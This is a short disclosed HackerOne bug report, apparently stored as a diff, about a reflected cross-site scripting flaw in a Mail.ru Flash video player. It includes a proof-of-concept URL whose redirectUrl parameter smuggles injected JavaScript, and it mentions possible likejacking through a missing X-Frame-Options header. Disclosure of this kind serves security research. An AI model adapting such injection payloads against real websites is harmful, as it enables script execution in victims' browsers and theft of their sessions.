@@ -1,0 +1,20 @@
+ReportLink:https://hackerone.com/reports/58831
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/tunnelshade
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:30.10.2015 12:22:06
+
+Summary:
+
+Vulnerable Flash File: http://img.mail.ru/r/video2/player_v2.swf
+
+Steps:
++ Open http://img.mail.ru/r/video2/player_v2.swf?metadataUrl=http://videoapi.my.mail.ru/videos//community/mir/_groupvideo/921.json&redirectUrl=\%22));alert(document.domain);}catch(e){}//
++ Click on social share and click on anything (eg. twitter)
+
+Severity:
++ XSS on 
++ There is an ActionScript function `ApplicationController.like` bound to javascript using external interface. So, I suspect that like jacking is possible since img.mail.ru doesn't send **X-FRAME-OPTIONS**.
